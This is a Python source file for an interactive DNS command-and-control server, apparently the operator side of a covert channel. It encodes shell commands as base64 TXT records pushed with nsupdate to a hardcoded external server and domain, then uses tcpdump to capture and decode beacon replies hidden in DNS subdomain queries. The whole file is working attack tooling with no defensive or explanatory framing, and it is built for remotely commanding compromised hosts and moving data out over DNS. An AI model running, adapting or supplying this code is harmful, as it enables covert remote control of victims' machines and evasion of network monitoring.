import base64
import subprocess
import re
import time

DNS_SERVER = "159.223.6.139"
DOMAIN = "command.connect.menorraitdev.net"
CHECK_INTERVAL = 5  


def update_txt_record(encoded_command):

    nsupdate_cmds = f"""
server {DNS_SERVER}
update delete {DOMAIN} TXT
update add {DOMAIN} 60 TXT "{encoded_command}"
send
"""
    try:
        process = subprocess.run(
            ["nsupdate", "-v"],
            input=nsupdate_cmds,
            text=True,
            capture_output=True,
        )
        if process.returncode == 0:
            print(f"Updated TXT record: {encoded_command}")
        else:
            print(f"Error updating TXT record: {process.stderr}")
    except Exception as e:
        print(f"Failed to update TXT record: {e}")


def monitor_tcpdump():
    
    tcpdump_cmd = [
        "tcpdump",
        "-i",
        "any",
        "port",
        "53",
        "-n",
        "-vv",
        "-l", 
    ]
    try:
        process = subprocess.Popen(
            tcpdump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        print("Listening for beacon responses...")
        for line in process.stdout:
            match = re.search(r"([\w\-=]+)\.command\.connect\.menorraitdev\.net", line)
            if match:
                encoded_response = match.group(1)
                try:
                    decoded_response = base64.b64decode(encoded_response).decode("utf-8")
                    print(f"Beacon response: {decoded_response}")
                    return decoded_response
                except Exception as e:
                    print(f"Error decoding response: {e}")
                    continue
    except KeyboardInterrupt:
        process.terminate()
        print("\nStopped monitoring TCPDUMP.")
        return None
    except Exception as e:
        print(f"Error running tcpdump: {e}")
        return None


def main():
    print("Interactive DNS C2 Server")
    while True:
        command = input("Enter command to execute (or 'exit' to quit): ").strip()
        if command.lower() == "exit":
            print("Exiting...")
            break

        
        encoded_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
        update_txt_record(encoded_command)

        print("Waiting for beacon response...")
        while True:
            response = monitor_tcpdump()
            if response:
                print(f"Received response: {response}")
                break
            time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
